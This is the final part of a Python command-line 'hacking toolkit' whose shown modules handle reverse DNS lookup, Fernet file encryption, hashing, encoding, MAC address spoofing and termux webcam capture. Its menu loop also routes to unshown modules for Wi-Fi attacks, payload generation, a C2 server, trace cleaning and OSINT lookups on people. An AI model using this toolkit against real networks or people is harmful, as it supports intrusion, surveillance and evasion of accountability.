{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    REVERSE IP LOOKUP                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        ip = input(f"{self.prompt()}IP address > ")
        
        try:
            import dns.reversename
            addr = dns.reversename.from_address(ip)
            print(f"{Colors.GREEN}[+] PTR Record:{Colors.END}")
            print(f"    {dns.resolver.resolve(addr, 'PTR')[0]}")
        except:
            print(f"{Colors.RED}[!] No PTR record found{Colors.END}")
    
    # ============================================================
    # UTILITY MODULES
    # ============================================================
    
    def file_crypt(self):
        """File encryption/decryption with AES"""
        try:
            from cryptography.fernet import Fernet
        except:
            print(f"{Colors.RED}[!] Install cryptography: pip install cryptography{Colors.END}")
            return
        
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    FILE CRYPT MODULE                                 ║
║              "Lock secrets away"                                      ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Encrypt file")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Decrypt file")
        choice = input(self.prompt())
        
        if choice == '1':
            filepath = input(f"{self.prompt()}file to encrypt > ")
            if os.path.exists(filepath):
                key = Fernet.generate_key()
                cipher = Fernet(key)
                
                with open(filepath, 'rb') as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)
                
                outfile = filepath + '.enc'
                with open(outfile, 'wb') as f:
                    f.write(encrypted)
                
                keyfile = filepath + '.key'
                with open(keyfile, 'wb') as f:
                    f.write(key)
                
                print(f"{Colors.GREEN}[+] Encrypted: {outfile}{Colors.END}")
                print(f"{Colors.GREEN}[+] Key saved: {keyfile}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] File not found{Colors.END}")
        
        elif choice == '2':
            encfile = input(f"{self.prompt()}encrypted file > ")
            keyfile = input(f"{self.prompt()}key file > ")
            
            if os.path.exists(encfile) and os.path.exists(keyfile):
                with open(keyfile, 'rb') as f:
                    key = f.read()
                cipher = Fernet(key)
                
                with open(encfile, 'rb') as f:
                    data = f.read()
                decrypted = cipher.decrypt(data)
                
                outfile = encfile.replace('.enc', '.dec')
                with open(outfile, 'wb') as f:
                    f.write(decrypted)
                
                print(f"{Colors.GREEN}[+] Decrypted: {outfile}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Files not found{Colors.END}")
    
    def hash_generator(self):
        """Generate hashes (MD5, SHA1, SHA256)"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    HASH GENERATOR MODULE                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        text = input(f"{self.prompt()}text to hash > ")
        
        print(f"\n{Colors.GREEN}[+] Hashes:{Colors.END}")
        print(f"    MD5: {hashlib.md5(text.encode()).hexdigest()}")
        print(f"    SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"    SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
    
    def encode_decode(self):
        """Base64 and URL encoder/decoder"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    ENCODE/DECODE MODULE                              ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Base64 Encode")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Base64 Decode")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} URL Encode")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} URL Decode")
        choice = input(self.prompt())
        
        text = input(f"{self.prompt()}text > ")
        
        if choice == '1':
            encoded = base64.b64encode(text.encode()).decode()
            print(f"{Colors.GREEN}[+] Base64: {encoded}{Colors.END}")
        elif choice == '2':
            try:
                decoded = base64.b64decode(text).decode()
                print(f"{Colors.GREEN}[+] Decoded: {decoded}{Colors.END}")
            except:
                print(f"{Colors.RED}[!] Invalid Base64{Colors.END}")
        elif choice == '3':
            encoded = requests.utils.quote(text)
            print(f"{Colors.GREEN}[+] URL Encoded: {encoded}{Colors.END}")
        elif choice == '4':
            decoded = requests.utils.unquote(text)
            print(f"{Colors.GREEN}[+] URL Decoded: {decoded}{Colors.END}")
    
    def mac_changer(self):
        """MAC address changer (requires root)"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    MAC CHANGER MODULE                                ║
║              "Change your identity"                                   ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        # Check if root
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] Root required for MAC changing{Colors.END}")
            return
        
        interfaces = os.listdir('/sys/class/net/')
        print(f"{Colors.GREEN}Available interfaces:{Colors.END}")
        for iface in interfaces:
            if iface.startswith(('eth', 'wlan', 'enp', 'wl')):
                print(f"    {iface}")
        
        iface = input(f"{self.prompt()}interface > ")
        
        if iface in interfaces:
            os.system(f"ifconfig {iface} down")
            os.system(f"macchanger -r {iface}")
            os.system(f"ifconfig {iface} up")
            print(f"{Colors.GREEN}[+] MAC address changed on {iface}{Colors.END}")
        else:
            print(f"{Colors.RED}[!] Interface not found{Colors.END}")
    
    def webcam_capture(self):
        """Capture photo from webcam (termux-api)"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    WEBCAM CAPTURE MODULE                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        # Check if termux-api is available
        termux_check = subprocess.run(['which', 'termux-camera-photo'], capture_output=True)
        
        if termux_check.returncode == 0:
            filename = f"{self.shadow_dir}/webcam_{int(time.time())}.jpg"
            os.system(f"termux-camera-photo {filename}")
            print(f"{Colors.GREEN}[+] Photo saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] termux-camera-photo not found{Colors.END}")
            print(f"{Colors.YELLOW}[*] Install termux-api: pkg install termux-api{Colors.END}")
    
    # ============================================================
    # MAIN LOOP
    # ============================================================
    
    def run(self):
        """Main execution loop"""
        self.clear_screen()
        
        while True:
            try:
                cmd = input(self.prompt()).strip().lower()
                
                # Attack modules
                if cmd in ['wifi', 'w']:
                    self.wifi_attack()
                elif cmd in ['payload', 'p']:
                    self.generate_payload()
                elif cmd in ['c2', 'server']:
                    self.start_c2()
                elif cmd in ['stealth', 's']:
                    self.stealth_clean()
                elif cmd in ['anon', 'a']:
                    self.anonymity()
                
                # OSINT modules
                elif cmd in ['phone', 'tel', 'caller']:
                    self.phone_osint()
                elif cmd in ['ip', 'geo', 'track', 'locate']:
                    self.ip_tracker()
                elif cmd in ['username', 'user', 'social', 'sherlock']:
                    self.username_check()
                elif cmd in ['subdomain', 'sub', 'dnsrecon']:
                    self.subdomain_scan()
                elif cmd in ['port', 'scan', 'nmap']:
                    self.port_scanner()
                elif cmd in ['dork', 'google', 'ghdb']:
                    self.dork_generator()
                elif cmd in ['email', 'mail']:
                    self.email_osint()
                elif cmd in ['whois']:
                    self.whois_lookup()
                elif cmd in ['dns']:
                    self.dns_lookup()
                elif cmd in ['reverseip', 'revip', 'ptr']:
                    self.reverse_ip()
                
                # Utility modules
                elif cmd in ['crypt', 'encrypt', 'decrypt']:
                    self.file_crypt()
                elif cmd in ['hash', 'md5', 'sha']:
                    self.hash_generator()
                elif cmd in ['encode', 'decode', 'base64']:
                    self.encode_decode()
                elif cmd in ['mac', 'macchanger']:
                    self.mac_changer()
                elif cmd in ['webcam', 'cam']:
                    self.webcam_capture()
                
                # System commands
                elif cmd in ['clear', 'cls']:
                    self.clear_screen()
                elif cmd in ['help', '?', 'menu']:
                    self.show_help()
                elif cmd in ['exit', 'quit', 'q']:
                    print(f"{Colors.RED}[!] Returning to void...{Colors.END}")
                    sys.exit(0)
                elif cmd == '':
                    continue
                else:
                    print(f"{Colors.RED}[!] Unknown command: {cmd}. Type 'help' for available commands.{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    core = ForgottenCore()
    core.run()
